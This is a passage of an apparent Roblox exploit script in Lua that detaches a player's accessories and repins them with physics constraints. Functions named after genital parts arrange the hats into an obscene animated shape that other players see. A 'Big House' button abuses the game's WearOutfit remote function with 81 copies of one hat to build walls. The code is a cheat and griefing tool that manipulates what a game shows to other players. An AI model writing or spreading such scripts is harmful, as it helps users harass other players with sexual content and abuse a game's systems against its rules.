local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = .4
Yval.Value = -3
Zval.Value = -1

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game:GetService('RunService').Stepped:connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function penis_Tip()
    -- Main Animation
-- Hat Position
local HAT = "Mushroom"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -3.3

XvalO.Value = -90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function penis_Sucker()
    -- Main Animation
-- Hat Position
local HAT = "Gerald"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.4
Zval.Value = -4

XvalO.Value = 0
YvalO.Value = 180
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};



for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end
succToggle = true
local function succ()
    if succToggle == true then
    succToggle = false
    Zval.Value = -3.6
    wait()
    Zval.Value = -4.4
    wait()
    Zval.Value = -4.8
    wait()
    Zval.Value = -5
    wait()
    Zval.Value = -5.4
    wait()
    Zval.Value = -5
    wait()
    Zval.Value = -4.8
    wait()
    Zval.Value = -4.4
    wait()
    Zval.Value = -4
    wait()
    succToggle = true
    end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
succ()
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function penis_Pubes()
    -- Main Animation
-- Hat Position
local HAT = "Ultra-Fabulous Hair Brown"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.2
Zval.Value = -.4

XvalO.Value = -90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end
end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

penis_Shaft()
penis_Left_Ball()
penis_Right_Ball()
penis_Tip()
penis_Sucker()
penis_Pubes()


end)

Script_8.Name = "Script"
Script_8.Parent = HatScripts
Script_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_8.Position = UDim2.new(1.32692313, 0, 13, 0)
Script_8.Size = UDim2.new(0, 52, 0, 19)
Script_8.Visible = false
Script_8.Font = Enum.Font.SourceSans
Script_8.Text = "Big House"
Script_8.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_8.TextSize = 14.000
Script_8.MouseButton1Click:Connect(function()
   if game.Players.LocalPlayer.Name == game.Players.LocalPlayer.Name then
       local part = Instance.new("Part", workspace)


plr = game.Players.LocalPlayer
part.Anchored = true
part.CanCollide = false
part.Size = Vector3.new(1,1,1)
part.Transparency = math.huge
changetog = true
startog = true

mouse = plr:GetMouse()

part.Position = Vector3.new(mouse.Hit.X, mouse.Hit.Y + 2, mouse.Hit.Z)
mouse.Button1Down:connect(function()
part.Position = Vector3.new(mouse.Hit.X, mouse.Hit.Y + 2, mouse.Hit.Z)
end)

local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "4794315940"
local args = {
    Face = "";
    
    Hat1 = code;
    Hat2 = code;
    Hat3 = code;
    Hat4 = code;
    Hat5 = code;
    Hat6 = code;
    Hat7 = code;
    Hat8 = code;
    Hat9 = code;
    Hat10 = code;
    Hat11 = code;
    Hat12 = code;
    Hat13 = code;
    Hat14 = code;
    Hat15 = code;
    Hat16 = code;
    Hat17 = code;
    Hat18 = code;
    Hat19 = code;
    Hat20 = code;
    Hat21 = code;
    Hat22 = code;
    Hat23 = code;
    Hat24 = code;
    Hat25 = code;
    Hat26 = code;
    Hat27 = code;
    Hat28 = code;
    Hat29 = code;
    Hat30 = code;
    Hat31 = code;
    Hat32 = code;
    Hat33 = code;
    Hat34 = code;
    Hat35 = code;
    Hat36 = code;
    Hat37 = code;
    Hat38 = code;
    Hat39 = code;
    Hat40 = code;
    Hat41 = code;
    Hat42 = code;
    Hat43 = code;
    Hat44 = code;
    Hat45 = code;
    Hat46 = code;
    Hat47 = code;
    Hat48 = code;
    Hat49 = code;
    Hat50 = code;
    Hat51 = code;
    Hat52 = code;
    Hat53 = code;
    Hat54 = code;
    Hat55 = code;
    Hat56 = code;
    Hat57 = code;
    Hat58 = code;
    Hat59 = code;
    Hat60 = code;
    Hat61 = code;
    Hat62 = code;
    Hat63 = code;
    Hat64 = code;
    Hat65 = code;
    Hat66 = code;
    Hat67 = code;
    Hat68 = code;
    Hat69 = code;
    Hat70 = code;
    Hat71 = code;
    Hat72 = code;
    Hat73 = code;
    Hat74 = code;
    Hat75 = code;
    Hat76 = code;
    Hat77 = code;
    Hat78 = code;
    Hat79 = code;
    Hat80 = code;
    Hat81 = code;
    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}



-- Main Animation
-- Hat Position
local function wall1_1()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "1"
local HAT = "1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};



for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_2()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "2"
local HAT = "2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 0
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_3()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "3"
local HAT = "3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 0
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_4()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "4"
local HAT = "4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 0
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_5()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "5"
local HAT = "5"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 0
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};


for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_6()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "6"
local HAT = "6"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 4
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_7()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "7"
local HAT = "7"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 4
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_8()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "8"
local HAT = "8"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -6
Yval.Value = 4
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall1_9()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "9"
local HAT = "9"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 6
Yval.Value = 4
Zval.Value = -10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
